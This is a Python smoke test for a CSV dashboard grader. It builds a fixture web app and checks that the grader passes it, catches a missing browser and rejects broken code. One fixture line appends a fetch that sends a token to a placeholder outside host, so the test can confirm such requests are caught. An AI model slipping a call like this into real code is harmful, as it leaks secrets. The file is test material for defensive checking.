"""Check that the external CSV grader accepts a working app and rejects a broken one."""

import json
import os
import subprocess
from pathlib import Path
from tempfile import TemporaryDirectory


REPO = Path(__file__).resolve().parents[2]
GRADER = REPO / "tests/cli/csv_dashboard_grader.mjs"


def grade(workspace, threshold=False, browser=None):
    command = ["node", str(GRADER), str(workspace)]
    if threshold:
        command.append("--require-threshold")
    env = dict(os.environ)
    if browser is not None:
        env["RNA_BROWSER_EXECUTABLE"] = browser
    result = subprocess.run(command, env=env, capture_output=True, text=True, timeout=40, check=False)
    return result.returncode, json.loads(result.stdout)


def main():
    with TemporaryDirectory(prefix="rna-csv-grader-smoke-") as folder:
        root = Path(folder)
        (root / "index.html").write_text(
            '<!doctype html><link rel="stylesheet" href="styles.css">'
            '<input type="file" id="csv-file"><select id="category-filter">'
            '<option value="all">All</option></select><button id="sort-amount">Sort</button>'
            '<input type="number" id="min-amount" value="0"><table><tbody id="rows">'
            '</tbody></table><span id="total"></span><svg id="chart"></svg>'
            '<button id="export">Export</button><p id="status"></p>'
            '<script src="app.js"></script>', encoding="utf-8")
        (root / "styles.css").write_text("body { font-family: sans-serif; }", encoding="utf-8")
        script = root / "app.js"
        script.write_text(
            """let data=[];let ascending=true;const q=id=>document.getElementById(id);
function visible(){return data.filter(r=>(q('category-filter').value==='all'||r[1]===q('category-filter').value)&&r[2]>=Number(q('min-amount').value||0)).sort((a,b)=>ascending?a[2]-b[2]:b[2]-a[2])}
function render(){const rows=visible();q('rows').innerHTML=rows.map(r=>'<tr><td>'+r[0]+'</td><td>'+r[1]+'</td><td>'+r[2]+'</td></tr>').join('');q('total').textContent=String(rows.reduce((a,r)=>a+r[2],0));q('chart').innerHTML=rows.map((r,i)=>'<rect x="'+(i*20)+'" y="0" width="10" height="'+r[2]+'"></rect>').join('')}
q('csv-file').addEventListener('change',async e=>{const text=await e.target.files[0].text();if(!text.trim()){q('status').textContent='Empty CSV';data=[];render();return}const lines=text.trim().split(/\\r?\\n/).map(x=>x.split(','));if(lines[0].join(',')!=='name,category,amount'||lines.slice(1).some(r=>r.length!==3||!Number.isFinite(Number(r[2])))){q('status').textContent='Invalid CSV';data=[];render();return}q('status').textContent='';data=lines.slice(1).map(r=>[r[0],r[1],Number(r[2])]);q('category-filter').innerHTML='<option value="all">All</option>'+[...new Set(data.map(r=>r[1]))].map(x=>'<option value="'+x+'">'+x+'</option>').join('');render()});
q('category-filter').addEventListener('change',render);q('sort-amount').addEventListener('click',()=>{ascending=!ascending;render()});q('min-amount').addEventListener('input',render);
q('export').addEventListener('click',()=>{const csv='name,category,amount\\n'+visible().map(r=>r.join(',')).join('\\n')+'\\n';const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([csv],{type:'text/csv'}));a.download='visible.csv';a.click();setTimeout(()=>URL.revokeObjectURL(a.href),1000)});
""", encoding="utf-8")
        code, report = grade(root, threshold=True)
        assert code == 0 and report["status"] == "passed", report
        assert len(report["assertions"]) == 13, report

        code, report = grade(root, browser="/missing/chromium")
        assert code == 4 and report["status"] == "not-run", report

        working = script.read_text(encoding="utf-8")
        script.write_text(working + "\nfetch('https://example.invalid/private?token=hidden').catch(()=>{});\n",
                          encoding="utf-8")
        code, report = grade(root)
        assert code == 5 and report["externalRequests"], report
        assert all("token=" not in url for url in report["externalRequests"]), report

        script.write_text('throw new Error("broken fixture")', encoding="utf-8")
        code, report = grade(root)
        assert code == 5 and report["status"] == "failed", report
        assert any("broken fixture" in error for error in report["errors"]), report
        print("PASS CSV dashboard grader: 13 working assertions, missing browser, external request, broken JS rejected")


if __name__ == "__main__":
    main()
